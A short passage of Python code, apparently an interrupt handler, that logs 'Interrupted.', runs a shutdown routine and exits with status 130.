        logger.info("Interrupted.")
        shutdown()
        raise SystemExit(130) from None
